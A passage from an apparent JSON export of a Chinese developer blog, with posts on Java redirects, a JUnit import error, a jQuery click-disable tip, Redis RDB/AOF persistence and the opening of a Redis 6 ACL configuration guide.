当状态码为302时，表明资源位置临时发生了改变，需要进行重定向，location头信息标识了资源转向的位置，该地址写相对地址\n\n     ```java\n     response.setStatus(302);\n     response.setHeader(HttpHeaders.LOCATION, consultUser.getSession_path() + \"/dept_sub_consult/source/notice\");\n     ```\n\n  2. 使用转发\n\n     ```java\n     request.getRequestDispatcher(consultUser.getSession_path() + \"/intermediate/list\").forward(request,response);\n     ```\n\n     \n\n# JUnit测试提示Java.lang.Exception: No runnable methods\n\n- 问题描述：\n\n  ![image-20230315103150697](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230315103150697.png)  \n\n- 解决\n\n  @Test导入的包错了，spring-test 需要的Junit是org.junit.Test，但是在@Test有两个包，另一个是org.junit.jupiter.api.Test，\n\n","tags":["随笔"],"categories":["后端"]},{"title":"前端日常问题记录","url":"/20250619/33f402b5.html","content":"\n\n\n\n\n# 在SPAN元素上禁用设置属性不会阻止点击事件（jquery）\n\n来源：https://www.jb51.cc/jquery/182333.html\n\n一个SPAN元素，在点击事件上做某事。当我禁用它，使用jQuery：`$(“span”).attr(“disabled”，true)` 无效\n\n### 解决方法\n\n尝试这个：\n\n```\n$(\"span\").css(\"pointer-events\",\"none\");\n```\n\n你可以启用这些\n\n```\n$(\"span\").css(\"pointer-events\",\"auto\");\n```","tags":["随笔"],"categories":["前端"]},{"title":"Redis-持久化","url":"/20250619/574fe2f4.html","content":"\n- **为什么需要持久化**？\n\n  Redis是个基于内存的数据库。那服务一旦宕机，内存中的数据将全部丢失。通常的解决方案是从后端数据库恢复这些数据，但后端数据库有性能瓶颈，如果是大数据量的恢复  1、会对数据库带来巨大的压力，2、数据库的性能不如Redis。导致程序响应慢。所以对Redis来说，实现数据的持久化，避免从后端数据库中恢复数据，是至关重要的。\n\n- **Redis持久化有哪些方式呢**？\n\n  从严格意义上说，Redis服务提供四种持久化存储方案：`RDB`、`AOF`、`虚拟内存（VM）`和　`DISKSTORE`。\n\n  **虚拟内存（VM）方式**，从Redis Version 2.4开始就被官方明确表示不再建议使用，Version 3.2版本中更找不到关于虚拟内存（VM）的任何配置范例.Redis的主要作者Salvatore Sanfilippo还专门写了一篇论文，来反思Redis对虚拟内存（VM）存储技术的支持问题。\n\n  **DISKSTORE方式**，是从Redis Version 2.8版本开始提出的一个存储设想，到目前为止Redis官方也没有在任何stable版本中明确建议使用这用方式。在Version 3.2版本中同样找不到对于这种存储方式的明确支持\n\n  \n\n- **为什么我们需要重点学RDB和AOF**？\n\n  目前官方文档上能够看到的Redis对持久化存储的支持明确的就只有两种方案（https://redis.io/topics/persistence）：RDB和AOF\n\n# RDB\n\n> RDB 就是 Redis DataBase 的缩写，中文名为快照/内存快照，RDB持久化是把当前进程数据生成快照保存到磁盘上的过程，由于是某一时刻的快照，那么快照中的值要早于或者等于内存中的值\n\n## 触发方式\n\n> 触发rdb持久化的方式有2种，分别是**手动触发**和**自动触发**。\n\n### 手动触发\n\n> 手动触发分别对应`save`和`bgsave`命令，会在`data`文件夹下生成`dump.rdb`文件\n\n- **save命令**：阻塞当前Redis服务器，直到RDB过程完成为止，对于内存 比较大的实例会造成长时间**阻塞**，线上环境不建议使用\n\n- **bgsave命令**：Redis进程执行`fork`操作，创建子进程，RDB持久化过程由子进程负责，完成后自动结束。阻塞只发生在fork阶段，一般时间很短。具体流程如下：\n1. redis客户端执行`bgsave`命令或者自动触发`bgsave`命令；\n  \n2. 主进程判断当前是否已经存在正在执行的子进程，如果存在，那么主进程直接返回；\n  \n3. 如果不存在正在执行的子进程，那么就`fork`一个新的子进程进行持久化数据，**`fork`过程是阻塞的**，fork操作完成后主进程即可执行其他操作；\n  \n4. 子进程先将数据写入到临时的`rdb`文件中，待快照数据写入完成后再原子替换旧的`rdb`文件；\n  \n5. 同时发送信号给主进程，通知主进程`rdb`持久化完成，主进程更新相关的统计信息（info persitence下的rdb_*相关选项）。\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/redis-x-rdb-1-1676430207109-3.png) \n\n\n\n### 自动触发\n\n在以下4种情况时会自动触发\n\n- redis.conf中配置`save m n`，即在m秒内有n次修改时，自动触发bgsave生成rdb文件；\n\n- 主从复制时，从节点要从主节点进行全量复制时也会触发bgsave操作，生成当时的快照发送到从节点；\n\n- 执行`debug reload`命令重新加载redis时也会触发bgsave操作；\n\n- 默认情况下执行`shutdown`命令时，如果没有开启`aof`持久化，那么也会触发bgsave操作 \n\n## redis.conf配置RDB\n\n**快照周期**：内存快照虽然可以通过技术人员手动执行SAVE或BGSAVE命令来进行，但生产环境下多数情况都会设置其周期性执行条件。\n\n- **Redis中默认的周期新设置**\n\n  ```sh\n  # 周期性执行条件的设置格式为\n  save <seconds> <changes>\n  \n  # 默认的设置为：\n  save 900 1  # 如果900秒内有1条Key信息发生变化，则进行快照\n  save 300 10 # 如果300秒内有10条Key信息发生变化，则进行快照；\n  save 60 10000 # 如果60秒内有10000条Key信息发生变化，则进行快照；\n  \n  # 以下设置方式为关闭RDB快照功能\n  save \"\"\n  ```\n\n- **其它相关配置**\n\n  ```sh\n  # 文件名称\n  dbfilename dump.rdb\n  # 文件保存路径\n  dir /home/work/app/redis/data/\n  # 如果持久化出错，主进程是否停止写入\n  stop-writes-on-bgsave-error yes\n  # 是否压缩\n  rdbcompression yes\n  # 导入时是否检查\n  rdbchecksum yes\n  ```\n\n  - `dbfilename`：RDB文件在磁盘上的名称。\n\n  - `dir`：RDB文件的存储路径。默认设置为“./”，也就是Redis服务的主目录。\n\n  - `stop-writes-on-bgsave-error`：上文提到的在快照进行过程中，主进程照样可以接受客户端的任何写操作的特性，是指在快照操作正常的情况下。如果快照操作出现异常（例如操作系统用户权限不够、磁盘空间写满等等）时，Redis就会禁止写操作。这个特性的主要目的是使运维人员在第一时间就发现Redis的运行错误，并进行解决。一些特定的场景下，您可能需要对这个特性进行配置，这时就可以调整这个参数项。该参数项默认情况下值为yes，如果要关闭这个特性，指定即使出现快照错误Redis一样允许写操作，则可以将该值更改为no。\n\n  - `rdbcompression`：该属性将在字符串类型的数据被快照到磁盘文件时，启用LZF压缩算法。Redis官方的建议是请保持该选项设置为yes，因为“it’s almost always a win”。\n\n  - `rdbchecksum`：从RDB快照功能的version 5 版本开始，一个64位的CRC冗余校验编码会被放置在RDB文件的末尾，以便对整个RDB文件的完整性进行验证。这个功能大概会多损失10%左右的性能，但获得了更高的数据可靠性。所以如果您的Redis服务需要追求极致的性能，就可以将这个选项设置为no。\n\n  ##  RDB 更深入理解\n\n  > 由于生产环境中我们为Redis开辟的内存区域都比较大（例如6GB），那么将内存中的数据同步到硬盘的过程可能就会持续比较长的时间，而实际情况是这段时间Redis服务一般都会收到数据写操作请求。那么如何保证数据一致性呢\n\n  ​\t\tRDB中的核心思路是Copy-on-Write，来保证在进行快照操作的这段时间，需要压缩写入磁盘上的数据在内存中不会发生变化。在正常的快照操作中，一方面Redis主进程会fork一个新的快照进程专门来做这个事情，这样保证了Redis服务不会停止对客户端包括写请求在内的任何响应。另一方面这段时间发生的数据变化会以副本的方式存放在另一个新的内存区域，待快照操作结束后才会同步到原来的内存区域。\n\n  ​\t\t举个例子：如果主线程对这些数据也都是读操作（例如图中的键值对 A），那么，主线程和 bgsave 子进程相互不影响。但是，如果主线程要修改一块数据（例如图中的键值对 C），那么，这块数据就会被复制一份，生成该数据的副本。然后，bgsave 子进程会把这个副本数据写入 RDB 文件，而在这个过程中，主线程仍然可以直接修改原来的数据\n\n  ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/redis-x-aof-42.jpg) \n\n  - **在进行快照操作的这段时间，如果发生服务崩溃怎么办**？\n\n    很简单，在没有将数据全部写入到磁盘前，这次快照操作都不算成功。如果出现了服务崩溃的情况，将以上一次完整的RDB快照文件作为恢复内存数据的参考。也就是说，在快照操作过程中不能影响上一次的备份数据。Redis服务会在磁盘上创建一个临时文件进行数据操作，待操作成功后才会用这个临时文件替换掉上一次的备份。\n\n  - **可以每秒做一次快照吗**？\n\n    对于快照来说，所谓“连拍”就是指连续地做快照。这样一来，快照的间隔时间变得很短，即使某一时刻发生宕机了，因为上一时刻快照刚执行，丢失的数据也不会太多。但是，这其中的快照间隔时间就很关键了。\n\n    如下图所示，我们先在 T0 时刻做了一次快照，然后又在 T0+t 时刻做了一次快照，在这期间，数据块 5 和 9 被修改了。如果在 t 这段时间内，机器宕机了，那么，只能按照 T0 时刻的快照进行恢复。此时，数据块 5 和 9 的修改值因为没有快照记录，就无法恢复了。 \n\n  ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/redis-x-rdb-2.jpg) \n\n所以，要想尽可能恢复数据，t 值就要尽可能小，t 越小，就越像“连拍”。那么，t 值可以小到什么程度呢，比如说是不是可以每秒做一次快照？毕竟，每次快照都是由 bgsave 子进程在后台执行，也不会阻塞主线程。这种想法其实是错误的。虽然 bgsave 执行时不阻塞主线程，但是，**如果频繁地执行全量快照，也会带来两方面的开销**：\n\n- 一方面，频繁将全量数据写入磁盘，会给磁盘带来很大压力，多个快照竞争有限的磁盘带宽，前一个快照还没有做完，后一个又开始做了，容易造成恶性循环。\n- 另一方面，bgsave 子进程需要通过 fork 操作从主线程创建出来。虽然，子进程在创建后不会再阻塞主线程，但是，fork 这个创建过程本身会阻塞主线程，而且主线程的内存越大，阻塞时间越长。如果频繁 fork 出 bgsave 子进程，这就会频繁**阻塞主线程**了。\n\n那么，有什么其他好方法吗？此时，我们可以做增量快照，就是指做了一次全量快照后，后续的快照只对修改的数据进行快照记录，这样可以避免每次全量快照的开销。这个比较好理解。\n\n但是它需要我们使用额外的元数据信息去记录哪些数据被修改了，这会带来额外的**空间开销问题**。那么，还有什么方法既能利用 RDB 的快速恢复，又能以较小的开销做到尽量少丢数据呢？且看后文中4.0版本中引入的RDB和AOF的混合方式。 \n\n## RDB优缺点\n\n- **优点**\n  - RDB文件是某个时间节点的快照，默认使用LZF算法进行压缩，压缩后的文件体积远远小于内存大小，适用于备份、全量复制等场景；\n  - Redis加载RDB文件恢复数据要远远快于AOF方式；\n- **缺点**\n  - RDB方式实时性不够，无法做到秒级的持久化；\n  - 每次调用bgsave都需要fork子进程，fork子进程属于重量级操作，频繁执行成本较高；\n  - RDB文件是二进制的，没有可读性，AOF文件在了解其结构的情况下可以手动修改或者补全；\n  - 版本兼容RDB文件问题；\n\n针对RDB不适合实时持久化的问题，Redis提供了AOF持久化方式来解决\n\n\n\n# AOF\n\n> Redis是“写后”日志，Redis先执行命令，把数据写入内存，然后才记录日志。\n>\n> 日志里记录的是Redis收到的每一条命令，这些命令是以文本形式保存。PS: 大多数的数据库采用的是写前日志（WAL），例如MySQL，通过写前日志和两阶段提交，实现数据和逻辑的一致性。\n\n而AOF日志采用写后日志，即**先写内存，后写日志**。\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/redis-x-aof-41.jpg)\n\n**为什么采用写后日志**？\n\nRedis要求高性能，采用写日志有两方面好处：\n\n- **避免额外的检查开销**：Redis 在向 AOF 里面记录日志的时候，并不会先去对这些命令进行语法检查。所以，如果先记日志再执行命令的话，日志中就有可能记录了错误的命令，Redis 在使用日志恢复数据时，就可能会出错。\n- 不会阻塞当前的写操作，\n\n但这种方式存在潜在风险：\n\n- 如果命令执行完成，写日志之前宕机了，会丢失数据。\n- 主线程写磁盘压力大，导致写盘慢，阻塞后续操作。 \n\n## 如何实现AOF\n\nAOF日志记录Redis的每个写命令，步骤分为：命令追加（append）、文件写入（write）和 文件同步（sync）。\n\n- **命令追加** 当AOF持久化功能打开了，服务器在执行完一个写命令之后，会以协议格式将被执行的写命令追加到服务器的` aof_buf `缓冲区。\n\n- **文件写入和同步** 关于何时将 `aof_buf `缓冲区的内容写入AOF文件中，Redis提供了三种写回策略\n\n  ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/redis-x-aof-4.jpg)`Always`，同步写回：每个写命令执行完，立马同步地将日志写回磁盘；\n\n  `Everysec`，每秒写回：每个写命令执行完，只是先把日志写到AOF文件的内存缓冲区，每隔一秒把缓冲区中的内容写入磁盘；\n\n  `No`，操作系统控制的写回：每个写命令执行完，只是先把日志写到AOF文件的内存缓冲区，由操作系统决定何时将缓冲区内容写回磁盘。 \n\n- **三种写回策略的优缺点**\n\n  上面的三种写回策略体现了一个重要原则：**trade-off**，取舍，指在性能和可靠性保证之间做取舍。\n\n  关于AOF的同步策略是涉及到操作系统的 write 函数和 fsync 函数的，在《Redis设计与实现》中是这样说明的：\n\n  ```bash\n  为了提高文件写入效率，在现代操作系统中，当用户调用write函数，将一些数据写入文件时，操作系统通常会将数据暂存到一个内存缓冲区里，当缓冲区的空间被填满或超过了指定时限后，才真正将缓冲区的数据写入到磁盘里。\n  \n  这样的操作虽然提高了效率，但也为数据写入带来了安全问题：如果计算机停机，内存缓冲区中的数据会丢失。为此，系统提供了fsync、fdatasync同步函数，可以强制操作系统立刻将缓冲区中的数据写入到硬盘里，从而确保写入数据的安全性。\n  ```\n\n  \n\n## redis.conf中配置AOF\n\n默认情况下，Redis是没有开启AOF的，可以通过配置redis.conf文件来开启AOF持久化，关于AOF的配置如下：\n\n```sh\n# appendonly参数开启AOF持久化\nappendonly no\n\n# AOF持久化的文件名，默认是appendonly.aof\nappendfilename \"appendonly.aof\"\n\n# AOF文件的保存位置和RDB文件的位置相同，都是通过dir参数设置的\ndir ./\n\n# 同步策略\n# appendfsync always\nappendfsync everysec\n# appendfsync no\n\n# aof重写期间是否同步\nno-appendfsync-on-rewrite no\n\n# 重写触发配置\nauto-aof-rewrite-percentage 100\nauto-aof-rewrite-min-size 64mb\n\n# 加载aof出错如何处理\naof-load-truncated yes\n\n# 文件重写策略\naof-rewrite-incremental-fsync yes\n```\n\n- `appendonly`：默认情况下AOF功能是关闭的，将该选项改为yes以便打开Redis的AOF功能。\n\n- `appendfilename`：这个参数项很好理解了，就是AOF文件的名字。\n\n- `appendfsync`：这个参数项是AOF功能最重要的设置项之一，主要用于设置“真正执行”操作命令向AOF文件中同步的策略\n\n  什么叫“真正执行”呢？还记得Linux操作系统对磁盘设备的操作方式吗？ 为了保证操作系统中I/O队列的操作效率，应用程序提交的I/O操作请求一般是被放置在linux Page Cache中的，然后再由Linux操作系统中的策略自行决定正在写到磁盘上的时机。而Redis中有一个fsync()函数，可以将Page Cache中待写的数据真正写入到物理设备上，而缺点是频繁调用这个fsync()函数干预操作系统的既定策略，可能导致I/O卡顿的现象频繁 。\n\n  与上节对应，appendfsync参数项可以设置三个值，分别是：always、everysec、no，默认的值为everysec。\n\n- `no-appendfsync-on-rewrite`：always和everysec的设置会使真正的I/O操作高频度的出现，甚至会出现长时间的卡顿情况，这个问题出现在操作系统层面上，所有靠工作在操作系统之上的Redis是没法解决的。为了尽量缓解这个情况，Redis提供了这个设置项，保证在完成fsync函数调用时，不会将这段时间内发生的命令操作放入操作系统的Page Cache（这段时间Redis还在接受客户端的各种写操作命令）。\n\n- `auto-aof-rewrite-percentage`：上文说到在生产环境下，技术人员不可能随时随地使用“BGREWRITEAOF”命令去重写AOF文件。所以更多时候我们需要依靠Redis中对AOF文件的自动重写策略。Redis中对触发自动重写AOF文件的操作提供了两个设置：auto-aof-rewrite-percentage表示如果当前AOF文件的大小超过了上次重写后AOF文件的百分之多少后，就再次开始重写AOF文件。例如该参数值的默认设置值为100，意思就是如果AOF文件的大小超过上次AOF文件重写后的1倍，就启动重写操作。\n\n- `auto-aof-rewrite-min-size`：参考auto-aof-rewrite-percentage选项的介绍，auto-aof-rewrite-min-size设置项表示启动AOF文件重写操作的AOF文件最小大小。如果AOF文件大小低于这个值，则不会触发重写操作。注意，auto-aof-rewrite-percentage和auto-aof-rewrite-min-size只是用来控制Redis中自动对AOF文件进行重写的情况，如果是技术人员手动调用“BGREWRITEAOF”命令，则不受这两个限制条件左右。\n\n## 深入理解AOF重写\n\n> AOF会记录每个写命令到AOF文件，随着时间越来越长，AOF文件会变得越来越大。如果不加以控制，会对Redis服务器，甚至对操作系统造成影响，而且AOF文件越大，数据恢复也越慢。为了解决AOF文件体积膨胀的问题，Redis提供AOF文件重写机制来对AOF文件进行“瘦身”。\n\n- **图例解释AOF重写**\n\nRedis通过创建一个新的AOF文件来替换现有的AOF，新旧两个AOF文件保存的数据相同，但新AOF文件没有了冗余命令。\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/redis-x-aof-1-1676431861899-14.jpg)\n\n- **AOF重写会阻塞吗**？\n\n  AOF重写过程是由后台进程bgrewriteaof来完成的。主线程fork出后台的bgrewriteaof子进程，fork会把主线程的内存拷贝一份给bgrewriteaof子进程，这里面就包含了数据库的最新数据。然后，bgrewriteaof子进程就可以在不影响主线程的情况下，逐一把拷贝的数据写成操作，记入重写日志。\n\n  所以aof在重写时，在fork进程时是会阻塞住主线程的。\n\n- **AOF日志何时会重写**？\n\n  有两个配置项控制AOF重写的触发：\n\n  `auto-aof-rewrite-min-size`:表示运行AOF重写时文件的最小大小，默认为64MB。\n\n  `auto-aof-rewrite-percentage`: 这个值的计算方式是，当前aof文件大小和上一次重写后aof文件大小的差值，再除以上一次重写后aof文件大小。也就是当前aof文件比上一次重写后aof文件的增量大小，和上一次重写后aof文件大小的比值。\n\n- **重写日志时，有新数据写入咋整**？\n\n  重写过程总结为：“一个拷贝，两处日志”。在fork出子进程时的拷贝，以及在重写时，如果有新数据写入，主线程就会将命令记录到两个aof日志内存缓冲区中。如果AOF写回策略配置的是always，则直接将命令写回旧的日志文件，并且保存一份命令至`AOF重写缓冲区`，这些操作对新的日志文件是不存在影响的。（旧的日志文件：主线程使用的日志文件，新的日志文件：`bgrewriteaof`进程使用的日志文件）\n\n  而在`bgrewriteaof`子进程完成会日志文件的重写操作后，会提示主线程已经完成重写操作，主线程会将AOF重写缓冲中的命令追加到新的日志文件后面。这时候在高并发的情况下，AOF重写缓冲区积累可能会很大，这样就会造成阻塞，Redis后来通过Linux管道技术让aof重写期间就能同时进行回放，这样aof重写结束后只需回放少量剩余的数据即可。\n\n  最后通过修改文件名的方式，保证文件切换的原子性。\n\n  在AOF重写日志期间发生宕机的话，因为日志文件还没切换，所以恢复数据时，用的还是旧的日志文件。\n\n**总结操作**：\n\n- 主线程fork出子进程重写aof日志\n- 子进程重写日志完成后，主线程追加aof日志缓冲\n- 替换日志文件\n\n> 这里的进程和线程的概念有点混乱。因为后台的bgreweiteaof进程就只有一个线程在操作，而主线程是Redis的操作进程，也是单独一个线程。这里想表达的是Redis主进程在fork出一个后台进程之后，后台进程的操作和主进程是没有任何关联的，也不会阻塞主线程。\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/redis-x-aof-2-1676432308833-17.jpg)\n\n- **主线程fork出子进程的是如何复制内存数据的**？\n\n  fork采用操作系统提供的写时复制（copy on write）机制，就是为了避免一次性拷贝大量内存数据给子进程造成阻塞。fork子进程时，子进程时会拷贝父进程的页表，即虚实映射关系（虚拟内存和物理内存的映射索引表），而不会拷贝物理内存。这个拷贝会消耗大量cpu资源，并且拷贝完成前会阻塞主线程，阻塞时间取决于内存中的数据量，数据量越大，则内存页表越大。拷贝完成后，父子进程使用相同的内存地址空间。\n\n  但主进程是可以有数据写入的，这时候就会拷贝物理内存中的数据。如下图（进程1看做是主进程，进程2看做是子进程）：\n\n  ​\t![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/redis-x-aof-3-1676432355144-20.png) \n\n  在主进程有数据写入时，而这个数据刚好在页c中，操作系统会创建这个页面的副本（页c的副本)，即拷贝当前页的物理数据，将其映射到主进程中，而子进程还是使用原来的的页c。\n\n- **在重写日志整个过程时，主线程有哪些地方会被阻塞**？\n  1. fork子进程时，需要拷贝虚拟页表，会对主线程阻塞。\n  2. 主进程有bigkey写入时，操作系统会创建页面的副本，并拷贝原有的数据，会对主线程阻塞。\n  3. 子进程重写日志完成后，主进程追加aof重写缓冲区时可能会对主线程阻塞。\n\n- **为什么AOF重写不复用原AOF日志**？\n\n  两方面原因：\n\n  1. 父子进程写同一个文件会产生竞争问题，影响父进程的性能。\n  2. 如果AOF重写过程中失败了，相当于污染了原本的AOF文件，无法做恢复数据使用\n\n# RDB和AOF混合方式（4.0版本)\n\n> Redis 4.0 中提出了一个**混合使用 AOF 日志和内存快照**的方法。简单来说，内存快照以一定的频率执行，在两次快照之间，使用 AOF 日志记录这期间的所有命令操作。\n\n这样一来，快照不用很频繁地执行，这就避免了频繁 fork 对主线程的影响。而且，AOF 日志也只用记录两次快照间的操作，也就是说，不需要记录所有操作了，因此，就不会出现文件过大的情况了，也可以避免重写开销。\n\n如下图所示，T1 和 T2 时刻的修改，用 AOF 日志记录，等到第二次做全量快照时，就可以清空 AOF 日志，因为此时的修改都已经记录到快照中了，恢复时就不再用日志了。\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/redis-x-rdb-4.jpg) \n\n这个方法既能享受到 RDB 文件快速恢复的好处，又能享受到 AOF 只记录操作命令的简单优势, 实际环境中用的很多\n\n## 从持久化中恢复数据\n\n> 数据的备份、持久化做完了，我们如何从这些持久化文件中恢复数据呢？如果一台服务器上有既有RDB文件，又有AOF文件，该加载谁呢？\n\n其实想要从这些文件中恢复数据，只需要重新启动Redis即可。我们还是通过图来了解这个流程：\n\n ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/redis-x-aof-5-1676432697747-25.png) \n\n- redis重启时判断是否开启aof，如果开启了aof，那么就优先加载aof文件；\n- 如果aof存在，那么就去加载aof文件，加载成功的话redis重启成功，如果aof文件加载失败，那么会打印日志表示启动失败，此时可以去修复aof文件后重新启动；\n- 若aof文件不存在，那么redis就会转而去加载rdb文件，如果rdb文件不存在，redis直接启动成功；\n- 如果rdb文件存在就会去加载rdb文件恢复数据，如加载失败则打印日志提示启动失败，如加载成功，那么redis重启成功，且使用rdb文件恢复数据；\n\n那么为什么会优先加载AOF呢？因为AOF保存的数据更完整，通过上面的分析我们知道AOF基本上最多损失1s的数据。\n\n##   性能与实践\n\n通过上面的分析，我们都知道RDB的快照、AOF的重写都需要fork，这是一个重量级操作，会对Redis造成阻塞。因此为了不影响Redis主进程响应，我们需要尽可能降低阻塞。\n\n- 降低fork的频率，比如可以手动来触发RDB生成快照、与AOF重写；\n- 控制Redis最大使用内存，防止fork耗时过长；\n- 使用更牛逼的硬件；\n- 合理配置Linux的内存分配策略，避免因为物理内存不足导致fork失败。\n\n在线上我们到底该怎么做？我提供一些自己的实践经验。\n\n- 如果Redis中的数据并不是特别敏感或者可以通过其它方式重写生成数据，可以关闭持久化，如果丢失数据可以通过其它途径补回；\n- 自己制定策略定期检查Redis的情况，然后可以手动触发备份、重写数据；\n- 单机如果部署多个实例，要防止多个机器同时运行持久化、重写操作，防止出现内存、CPU、IO资源竞争，让持久化变为串行；\n- 可以加入主从机器，利用一台从机器进行备份处理，其它机器正常响应客户端的命令；\n- RDB持久化与AOF持久化可以同时存在，配合使用。 \n","tags":["Redis"],"categories":["数据库","Redis"]},{"title":"Redis-ACL","url":"/20250619/4be8fe93.html","content":"\n# 前言\n\n在 Redis6.0中引入了ACL（Access Control List) 的支持，可以给每个用户分配不同的权限来控制权限。\n\nRedis AUTH命令在Redis 6中进行了扩展，所以现在可以以双参数形式使用它:\n\n```sh\nAUTH <username> <password>\n```\n\n这里有一个旧形式的例子\n\n```sh\nAUTH <password>\n```\n\n所发生的情况是，用于身份验证的用户名是“default”，因此仅指定密码就意味着我们希望根据默认用户进行身份验证。这提供了向后兼容性。\n\n如果该用户具有 `nopass`规则，那么新的连接将立即作为“默认”用户进行身份验证，而不需要通过AUTH命令提供任何密码。\n\n如果“默认”用户没有标记为`nopass`，则连接将在未验证的状态下启动，并将需要AUTH(或HELLO命令AUTH选项)才能进行身份验证并开始工作。\n\n# 使用场景\n\n1. 您希望通过限制对命令和密钥的访问来提高安全性，这样不受信任的客户机就没有访问权限，而受信任的客户机只有执行所需工作所需的最低级别的数据库访问权限。例如，某些客户端可能只能执行只读命令。\n2. 您希望提高操作安全性，以便访问Redis的进程或人员不允许由于软件错误或手动错误而损坏数据或配置。例如，从Redis获取延迟作业的worker没有理由能够调用FLUSHALL命令。\n\n#  配置ACL\n\nRedis ACL用户的定义格式如下: `user <username> ... acl rules ...` 如` worker +@list +@connection ~jobs:* on >ffa9203c493aa99`\n\n默认情况下，只定义了一个名为default的用户。我们可以使用ACL LIST命令来检查当前活动的ACL，并验证一个新启动的、默认配置的Redis实例的配置是什么:\n\n```sh\n> ACL LIST\n1) \"user default on nopass ~* &* +@all\"\n```\n\n\n\n每行的前两个单词是“user”，后面跟着用户名。下一个单词是描述不同事物的ACL规则。我们将详细说明这些规则是如何工作的，但现在只需要说明默认用户被配置为活动(on)，不需要密码(nopass)，可以访问每个可能的密钥(~*)和发布/订阅通道(&*)，并且能够调用每个可能的命令(+@all)。\n\n此外，在默认用户的特殊情况下，使用`nopass`规则意味着新连接将自动使用默认用户进行身份验证，而不需要任何显式的AUTH调用。\n\n\n\n```sh\n> ACL SETUSER alice\nOK\n> ACL LIST\n1) \"user alice off resetchannels -@all\"\n2) \"user default on nopass ~* &* +@all\"\n\n\n# 这样的用户完全没用。让我们尝试定义用户，使其处于活动状态，具有密码，并且只能使用GET命令访问以字符串“cached:”开头的键名。\n> ACL SETUSER alice on >p1pp0 ~cached:* +get\nOK\n> AUTH alice p1pp0\nOK\n> GET foo\n(error) NOPERM this user has no permissions to access one of the keys used as arguments\n> GET cached:1234\n(nil)\n> SET cached:1234 zap\n(error) NOPERM this user has no permissions to run the 'set' command\n\n# ACL GETUSER 是 ACL LIST的替代方案，方便阅读\n> ACL GETUSER alice\n1) \"flags\"\n2) 1) \"on\"\n3) \"passwords\"\n4) 1) \"2d9c75...\"\n5) \"commands\"\n6) \"-@all +get\"\n7) \"keys\"\n8) \"~cached:*\"\n9) \"channels\"\n10) \"\"\n11) \"selectors\"\n12) (empty array)\n\n# 使用另一个ACL SETUSER命令(来自不同的用户，因为alice不能运行ACL命令)，我们可以向用户添加多个模式:\n> ACL SETUSER alice ~objects:* ~items:* ~public:*\nOK\n> ACL LIST\n1) \"user alice on #2d9c75... ~cached:* ~objects:* ~items:* ~public:* resetchannels -@all +get\"\n2) \"user default on nopass ~* &* +@all\"\n```\n\n\n\n\n\n# ACL规则\n\nACL规则可以以任意顺序指定：例如，可以从密码开始，然后是标志或密钥模式。但是请注意，加法和减法规则将根据顺序改变含义。\n\n```properties\n# 例如，请看下面的例子:\n#\n#   user alice on +@all -DEBUG ~* >somepassword\n#\n# 这将允许“alice”使用除DEBUG命令之外的所有命令,因为 +@all将所有命令添加到alice可以使用的命令集，后来DEBUG被删除。\n# 然而，如果我们颠倒两个ACL规则的顺序，结果将是不同的:\n#\n#   user alice on -DEBUG +@all ~* >somepassword\n#\n# 现在，当alice在允许的命令集中还没有命令时，DEBUG被删除，之后所有的命令都被添加，所以用户将能够执行所有的命令。\n```\n\n基本上ACL规则是从左到右处理的。\n\n下面是有效的ACL规则列表。某些规则只是单个单词，用于激活或删除标志，或执行对用户ACL的给定更改。其他规则是与命令或类别名称、键模式等连接在一起的字符前缀。\n\n- 启用和禁用用户\n\n  | 参数 | 说明                                                         |\n  | ---- | ------------------------------------------------------------ |\n  | on   | 启用用户：可以作为该用户进行身份验证。                       |\n  | off  | 禁止该用户：不再可能对该用户进行身份验证；但是，以前经过身份验证的连接仍然可以工作。<br />注意，如果默认用户被标记为关闭，那么新的连接将作为未验证启动，并且将要求用户发送带有AUTH选项的AUTH或HELLO，以便以某种方式进行身份验证，而不管默认用户配置如何。 |\n  |      |                                                              |\n\n- allow和disallow命令\n\n  | 参数 | 说明 |\n  | ---- | ---- |\n|+<command> | 将该命令添加到用户可以调用的命令列表中。可以与`|`一起使用以允许子命令（例如`+config|get`)。 |\n| -<command> | 将该命令移到用户可以调用的命令列表中。从Redis 7.0开始，它可以与`|`一起用于阻塞子命令（例如`+config|get`)。 |\n| +@<category> | 添加该类别中所有用户调用的命令，有效类别为@admin， @set， @sortedset，…诸如此类， `ACL CAT `命令查看完整的列表。<br />特殊类别@all表示所有命令，包括当前存在于服务器中的命令，以及将来将通过模块加载的命令。 |\n| -@<category> | 类似` +@<category>` 但是从客户端可以调用的命令列表中删除命令。 |\n| +<command>\\|first-arg（弃用） | 允许在其他情况下禁用命令的特定第一个参数<br />它只支持没有子命令的命令，并且不允许作为`-SELECT|1`这样的负形式，只支持以`+`开头的加法。 |\n| allcommands | ` +@all`另外一种书写形式.  注意，它意味着能够执行通过模块系统加载的所有未来命令。 |\n| nocommands | ` -@all`另外一种书写形式 |\n\n- 允许和禁止某些密钥和密钥权限\n\n  | 参数 | 说明 |\n  | ---- | ---- |\n  |~<pattern> | 可以作为命令的一部分, 添加一个键的模式 <br />例如` ~* ` 允许所有的键 。该模式是一个全局样式的模式，类似于KEYS的模式。可以指定多个模式。 |\n  | %R~<pattern> | (版本`7.0`之后)  添加键读取模式，指定可以从哪些键读取。<br />它的行为类似于常规键模式，但只授予从匹配给定模式的键读取的权限. <br />有关更多信息，请参阅关键权限。 |\n  | %W~<pattern> | (版本`7.0`之后)  添加指定的写键模式。指定可以写入哪些键。<br />它的行为类似于常规键模式，但只授予写入匹配给定模式的键的权限。<br />有关更多信息，请参阅关键权限。 |\n  | %RW~<pattern> | (版本`7.0`之后) ` ~<pattern>`另外一种书写形式 |\n  | allkeys | `~*`另外一种书写形式 |\n  | resetkeys | 刷新允许的键模式列表。 <br />例如`ACL ~foo:* ~bar:* resetkeys ~objects:*`，将只允许客户端访问匹配模式`objects:*`的键。 |\n\n- 允许和禁止发布/订阅频道:\n\n  | 参数          | 说明                                                         |\n  | ------------- | 